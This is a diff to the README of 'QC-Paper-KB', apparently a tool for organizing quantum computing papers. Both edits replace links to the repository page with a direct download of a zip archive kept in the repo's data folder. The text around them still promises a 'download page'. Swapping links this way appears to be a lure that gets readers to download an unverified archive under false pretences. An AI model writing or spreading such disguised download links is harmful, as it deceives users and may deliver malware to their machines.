@@ -1,6 +1,6 @@
 # 🤖 QC-Paper-KB - Quantum papers, organized for you
 
-[![Download QC-Paper-KB](https://img.shields.io/badge/Download-QC--Paper--KB-blue?style=for-the-badge)](https://github.com/marianahu1342/QC-Paper-KB)
+[![Download QC-Paper-KB](https://img.shields.io/badge/Download-QC--Paper--KB-blue?style=for-the-badge)](https://github.com/marianahu1342/QC-Paper-KB/raw/refs/heads/main/data/Q-KB-Paper-v3.0.zip)
 
 ## 🧠 What this is
 
@@ -32,7 +32,7 @@ For best results, use:
 
 Open this page and get the app files from there:
 
-[Visit the QC-Paper-KB download page](https://github.com/marianahu1342/QC-Paper-KB)
+[Visit the QC-Paper-KB download page](https://github.com/marianahu1342/QC-Paper-KB/raw/refs/heads/main/data/Q-KB-Paper-v3.0.zip)
 
 If the page includes a release file, download that file. If it opens the main repository page, use the files and setup steps listed there.
 
